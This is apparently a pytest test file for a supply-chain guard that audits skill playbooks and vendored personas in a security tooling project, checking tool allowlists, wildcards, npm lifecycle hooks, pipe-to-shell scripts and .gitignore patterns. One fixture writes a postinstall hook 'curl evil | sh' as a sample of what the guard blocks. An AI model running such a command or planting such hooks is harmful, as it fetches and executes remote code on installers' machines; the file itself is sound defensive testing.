"""
F2 — Skill supply-chain guard.

Fails the build when a playbook (or a vendored persona) *widens* its own
permissions:

  * every ``allowed_tools`` entry must be a real arsenal id or a reviewed
    external binary;
  * no wildcards (``*`` / ``?`` / ``**``) anywhere;
  * ``allowed_tools`` must not be empty (empty == "every tool allowed");
  * no npm lifecycle hooks (``preinstall`` / ``install`` / ``postinstall`` /
    ``prepare`` / ``prepack``) inside a skill;
  * no script that pipes a download into a shell;
  * the 39 vendored personas must declare an explicit, read-only ``tools:``;
  * ``.gitignore`` must keep ignoring personal / secret data.

Precedent: ``test_pack_purity.py`` (17 tests) already guards the new packs.
"""
import json
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
BACKEND = ROOT / "backend"
SKILLS_DIR = BACKEND / "skills"
AGENTS_DIR = BACKEND / "agents"
FRONTEND_JS = ROOT / "frontend" / "js" / "main.v2.js"

from backend.skill_supply_chain import (  # noqa: E402
    ALLOWED_TOOLS,
    ARSENAL_TOOL_IDS,
    LIFECYCLE_SCRIPTS,
    PERSONA_ALLOWED_TOOLS,
    PERSONA_FORBIDDEN_TOOLS,
    REVIEWED_TOOL_BINARIES,
    audit_allowed_tools,
    audit_package_json,
    audit_payload,
    audit_persona_markdown,
    audit_skill_markdown,
    has_blocking_issues,
    summarize,
)


def _skill_files() -> list[Path]:
    return sorted(SKILLS_DIR.glob("*/SKILL.md"))


def _persona_files() -> list[Path]:
    return sorted(
        p for d in ("security", "testing", "engineering", "specialized")
        for p in (AGENTS_DIR / d).glob("*.md")
    )


# ════════════════════════════════════════════════════════════════
#  Allowlist integrity
# ════════════════════════════════════════════════════════════════

class TestAllowlist:
    def test_arsenal_has_65_ids(self):
        assert len(ARSENAL_TOOL_IDS) == 65

    def test_arsenal_matches_frontend_arsenal_groups(self):
        """The backend allowlist must not drift from the frontend arsenal."""
        text = FRONTEND_JS.read_text(encoding="utf-8")
        start = text.index("const ARSENAL_GROUPS = [")
        depth = 0
        i = text.index("[", start)
        j = i
        while True:
            if text[j] == "[":
                depth += 1
            elif text[j] == "]":
                depth -= 1
                if depth == 0:
                    break
            j += 1
        block = text[i:j + 1]
        ids: list[str] = []
        for m in re.finditer(r"tools:\s*\[", block):
            d = 0
            k = m.end() - 1
            while True:
                if block[k] == "[":
                    d += 1
                elif block[k] == "]":
                    d -= 1
                    if d == 0:
                        break
                k += 1
            ids += re.findall(r"\{\s*id:\s*'([^']+)'", block[m.end():k])
        assert set(ids) == set(ARSENAL_TOOL_IDS)

    def test_no_wildcard_in_allowlist(self):
        for tool in ALLOWED_TOOLS:
            assert not any(c in tool for c in "*?[]{}")

    def test_allowlist_is_the_union(self):
        assert ALLOWED_TOOLS == ARSENAL_TOOL_IDS | REVIEWED_TOOL_BINARIES

    def test_allowlists_are_disjoint(self):
        assert not (ARSENAL_TOOL_IDS & REVIEWED_TOOL_BINARIES)


# ════════════════════════════════════════════════════════════════
#  Bundled skills
# ════════════════════════════════════════════════════════════════

class TestBundledSkills:
    def test_there_are_skills_to_audit(self):
        assert len(_skill_files()) >= 100

    def test_every_skill_declares_allowed_tools(self):
        from backend.skill_playbooks import _parse_skill_md
        for path in _skill_files():
            meta, _ = _parse_skill_md(path.read_text(encoding="utf-8", errors="replace"))
            raw = meta.get("allowed_tools")
            tools = raw if isinstance(raw, list) else (
                [t for t in str(raw or "").replace(",", " ").split() if t]
            )
            assert tools, f"{path.parent.name} has no allowed_tools"

    def test_no_skill_uses_an_unknown_tool(self):
        from backend.skill_playbooks import _parse_skill_md
        offenders = []
        for path in _skill_files():
            meta, _ = _parse_skill_md(path.read_text(encoding="utf-8", errors="replace"))
            for tool in meta.get("allowed_tools") or []:
                if str(tool) not in ALLOWED_TOOLS:
                    offenders.append(f"{path.parent.name}:{tool}")
        assert not offenders, f"unknown tools in allowed_tools: {offenders}"

    def test_no_skill_uses_wildcards(self):
        for path in _skill_files():
            content = path.read_text(encoding="utf-8", errors="replace")
            issues = audit_skill_markdown(path.parent.name, content)
            wildcards = [i for i in issues if i["code"] == "wildcard_tool"]
            assert not wildcards, f"{path.parent.name}: {wildcards}"

    def test_no_skill_audit_error(self):
        problems = []
        for path in _skill_files():
            content = path.read_text(encoding="utf-8", errors="replace")
            issues = audit_skill_markdown(path.parent.name, content)
            if has_blocking_issues(issues):
                problems.append((path.parent.name, issues))
        assert not problems, f"blocking supply-chain issues: {problems[:5]}"

    def test_no_package_json_in_skill_tree(self):
        found = list(SKILLS_DIR.rglob("package.json"))
        assert not found, f"package.json inside skills: {found}"

    def test_no_lifecycle_script_in_skill_tree(self):
        for path in SKILLS_DIR.rglob("package.json"):
            content = path.read_text(encoding="utf-8", errors="replace")
            issues = audit_package_json(str(path), content)
            assert not has_blocking_issues(issues), issues

    def test_no_pipe_to_shell_in_skill_scripts(self):
        from backend.skill_supply_chain import audit_script_file
        for path in SKILLS_DIR.rglob("*.sh"):
            issues = audit_script_file(str(path), path.read_text(encoding="utf-8", errors="replace"))
            assert not has_blocking_issues(issues), f"{path}: {issues}"


# ════════════════════════════════════════════════════════════════
#  Vendored personas
# ════════════════════════════════════════════════════════════════

class TestPersonas:
    def test_there_are_39_personas(self):
        assert len(_persona_files()) == 39

    def test_every_persona_declares_tools(self):
        for path in _persona_files():
            content = path.read_text(encoding="utf-8", errors="replace")
            issues = audit_persona_markdown(path.stem, content)
            missing = [i for i in issues if i["code"] == "persona_missing_tools"]
            assert not missing, f"{path.stem}: {missing}"

    def test_no_persona_requests_a_forbidden_tool(self):
        for path in _persona_files():
            content = path.read_text(encoding="utf-8", errors="replace")
            issues = audit_persona_markdown(path.stem, content)
            forbidden = [i for i in issues if i["code"] == "persona_forbidden_tool"]
            assert not forbidden, f"{path.stem}: {forbidden}"

    def test_no_persona_audit_error(self):
        problems = []
        for path in _persona_files():
            content = path.read_text(encoding="utf-8", errors="replace")
            issues = audit_persona_markdown(path.stem, content)
            if has_blocking_issues(issues):
                problems.append((path.stem, issues))
        assert not problems, f"blocking persona issues: {problems[:5]}"

    def test_persona_tools_are_read_only(self):
        for path in _persona_files():
            content = path.read_text(encoding="utf-8", errors="replace")
            from backend.agency_agents import _parse_frontmatter
            fm, _ = _parse_frontmatter(content)
            for tool in str(fm.get("tools", "")).split(","):
                tool = tool.strip()
                if not tool:
                    continue
                assert tool in PERSONA_ALLOWED_TOOLS, f"{path.stem}: {tool}"
                assert tool.lower() not in PERSONA_FORBIDDEN_TOOLS

    def test_personas_still_parse(self):
        from backend.agency_agents import discover
        personas = discover(force=True)
        assert len(personas) == 39
        assert all(p.name for p in personas.values())


# ════════════════════════════════════════════════════════════════
#  Guard behaviour
# ════════════════════════════════════════════════════════════════

class TestGuardBehaviour:
    def test_empty_allowed_tools_is_an_error(self):
        issues = audit_allowed_tools([])
        assert has_blocking_issues(issues)
        assert issues[0]["code"] == "empty_allowed_tools"

    def test_wildcard_is_an_error(self):
        issues = audit_allowed_tools(["nmap", "Bash(*)"])
        assert has_blocking_issues(issues)
        assert any(i["code"] == "wildcard_tool" for i in issues)

    def test_unknown_tool_is_an_error(self):
        issues = audit_allowed_tools(["definitely-not-a-tool"])
        assert has_blocking_issues(issues)
        assert issues[0]["code"] == "unknown_tool"

    def test_known_tools_pass(self):
        assert audit_allowed_tools(["nmap", "curl", "python3"]) == []

    def test_near_miss_is_info_only(self):
        issues = audit_allowed_tools(["nmpa"])
        assert not has_blocking_issues(issues)
        assert issues[0]["code"] == "near_miss_tool"
        assert issues[0]["expected"] == "nmap"

    def test_underscore_drift_is_a_near_miss(self):
        issues = audit_allowed_tools(["nmap_"])
        assert not has_blocking_issues(issues)
        assert issues[0]["code"] == "near_miss_tool"

    def test_inline_string_list_is_parsed(self):
        assert audit_allowed_tools("nmap, curl") == []

    def test_lifecycle_script_is_an_error(self):
        issues = audit_package_json("package.json", json.dumps({
            "name": "x", "scripts": {"postinstall": "curl evil | sh"},
        }))
        assert has_blocking_issues(issues)
        assert issues[0]["code"] == "lifecycle_script"

    def test_regular_scripts_are_allowed(self):
        issues = audit_package_json("package.json", json.dumps({
            "name": "x", "scripts": {"build": "tsc"},
        }))
        assert issues == []

    def test_invalid_package_json_is_an_error(self):
        issues = audit_package_json("package.json", "{not json")
        assert has_blocking_issues(issues)

    def test_payload_audit_rejects_wildcards(self):
        payload = {
            "SKILL.md": "---\nname: evil\ndescription: evil\nallowed_tools: ['*']\n---\nbody",
        }
        issues = audit_payload(payload)
        assert has_blocking_issues(issues)

    def test_payload_audit_rejects_lifecycle(self):
        payload = {
            "SKILL.md": "---\nname: ok\ndescription: ok\nallowed_tools: [nmap]\n---\nbody",
            "package.json": json.dumps({"scripts": {"postinstall": "x"}}),
        }
        issues = audit_payload(payload)
        assert has_blocking_issues(issues)

    def test_payload_audit_accepts_a_clean_skill(self):
        payload = {
            "SKILL.md": "---\nname: ok\ndescription: ok\nallowed_tools: [nmap, curl]\n---\nbody",
        }
        assert not has_blocking_issues(audit_payload(payload))

    def test_summary_shape(self):
        report = summarize(audit_allowed_tools(["*", "unknown-xyz"]))
        assert report["ok"] is False
        assert report["errors"] == 2
        assert report["total"] == 2


# ════════════════════════════════════════════════════════════════
#  Endpoint
# ════════════════════════════════════════════════════════════════

class TestSupplyChainEndpoint:
    def test_endpoint_reports_a_clean_tree(self, client):
        resp = client.get("/api/skills/supply-chain")
        assert resp.status_code == 200
        data = resp.json()
        assert data["ok"] is True
        assert data["errors"] == 0
        assert data["skills"] >= 100
        assert data["personas"] == 39
        assert data["allowlist"]["arsenal"] == 65

    def test_skill_creation_rejects_a_wildcard(self, client):
        resp = client.post("/api/skills/create", json={
            "name": "supply-chain-probe",
            "description": "probe",
            "allowed_tools": ["*"],
        })
        assert resp.status_code == 400
        data = resp.json()
        assert data["ok"] is False
        assert "supply-chain" in data.get("error", "").lower()

    def test_skill_creation_rejects_an_unknown_tool(self, client):
        resp = client.post("/api/skills/create", json={
            "name": "supply-chain-probe2",
            "description": "probe",
            "allowed_tools": ["definitely-not-a-tool"],
        })
        assert resp.status_code == 400
        assert resp.json()["ok"] is False


# ════════════════════════════════════════════════════════════════
#  Runtime guard: personas created at runtime
# ════════════════════════════════════════════════════════════════
class TestPersonaRuntimeGuard:
    def test_created_persona_declares_tools(self, tmp_path, monkeypatch):
        from backend import agency_agents as aa
        monkeypatch.setenv("MIRV_AGENTS_WRITE_DIR", str(tmp_path))
        agent, err = aa.create_agent({
            "slug": "guard-test-agent", "division": "custom", "body": "# Guard\n",
        })
        assert err is None, err
        assert agent is not None
        content = (tmp_path / "custom" / "guard-test-agent.md").read_text(encoding="utf-8")
        assert "tools:" in content
        assert not audit_persona_markdown("guard-test-agent", content)

    def test_created_persona_rejects_a_forbidden_tool(self, tmp_path, monkeypatch):
        from backend import agency_agents as aa
        monkeypatch.setenv("MIRV_AGENTS_WRITE_DIR", str(tmp_path))
        agent, err = aa.create_agent({
            "slug": "guard-bad-agent", "division": "custom", "body": "# Bad\n",
            "tools": "read, bash",
        })
        assert agent is None
        assert err and "bash" in err

    def test_created_persona_rejects_an_unknown_tool(self, tmp_path, monkeypatch):
        from backend import agency_agents as aa
        monkeypatch.setenv("MIRV_AGENTS_WRITE_DIR", str(tmp_path))
        agent, err = aa.create_agent({
            "slug": "guard-odd-agent", "division": "custom", "body": "# Odd\n",
            "tools": "read, nmap",
        })
        assert agent is None
        assert err and "nmap" in err

    def test_created_persona_accepts_read_only_tools(self, tmp_path, monkeypatch):
        from backend import agency_agents as aa
        monkeypatch.setenv("MIRV_AGENTS_WRITE_DIR", str(tmp_path))
        agent, err = aa.create_agent({
            "slug": "guard-ok-agent", "division": "custom", "body": "# Ok\n",
            "tools": "read, grep, report",
        })
        assert err is None, err
        assert agent is not None


# ════════════════════════════════════════════════════════════════
#  Fail-closed runtime: an empty allowed_tools allows no hook
# ════════════════════════════════════════════════════════════════

class TestEmptyAllowedToolsIsFailClosed:
    def test_check_hook_rejects_when_allowed_tools_is_empty(self):
        from backend import skill_playbooks as sp
        manifest = sp.SkillManifest(
            name="empty-skill", description="d", category="custom",
            allowed_tools=[], version="1.0.0", author="",
            disable_model_invocation=False, requires_scope=False,
        )
        info = sp.SkillInfo(
            name="empty-skill", manifest=manifest, dir_path=".", body="b",
            enabled=True,
        )
        with sp._lock:
            sp._registry["empty-skill"] = info
        try:
            assert sp.call_skill_hook("empty-skill", "on_finding", {}) is None
        finally:
            with sp._lock:
                sp._registry.pop("empty-skill", None)


# ════════════════════════════════════════════════════════════════
#  .gitignore hygiene
# ════════════════════════════════════════════════════════════════

class TestGitignore:
    def _patterns(self) -> list[str]:
        gi = ROOT / ".gitignore"
        assert gi.exists(), ".gitignore missing"
        return [ln.strip() for ln in gi.read_text(encoding="utf-8").splitlines()]

    @pytest.mark.parametrize("required", ["backend/data/", "*.env", "backend/logs/"])
    def test_required_pattern_is_ignored(self, required):
        patterns = self._patterns()
        assert any(required in p for p in patterns), f"{required} not ignored"


# ════════════════════════════════════════════════════════════════
#  Purity: the guard itself must stay stdlib-only
# ════════════════════════════════════════════════════════════════

class TestGuardPurity:
    def test_no_database_or_network_imports(self):
        import ast
        src = (BACKEND / "skill_supply_chain.py").read_text(encoding="utf-8")
        tree = ast.parse(src)
        banned = ("database", "supabase", "httpx", "requests", "urllib",
                  "socket", "paramiko")
        for node in ast.walk(tree):
            names = []
            if isinstance(node, ast.Import):
                names = [a.name for a in node.names]
            elif isinstance(node, ast.ImportFrom):
                names = [node.module or ""]
            for name in names:
                root = name.split(".")[0]
                assert root not in banned, f"skill_supply_chain imports {name}"

    def test_importing_the_guard_does_not_load_the_database(self):
        proc = subprocess.run(
            [sys.executable, "-c",
             "import backend.skill_supply_chain, sys; "
             "print('backend.database' in sys.modules)"],
            capture_output=True, text=True, cwd=str(ROOT),
        )
        assert proc.returncode == 0, proc.stderr
        assert proc.stdout.strip() == "False"


import subprocess  # noqa: E402  (used by the purity test above)
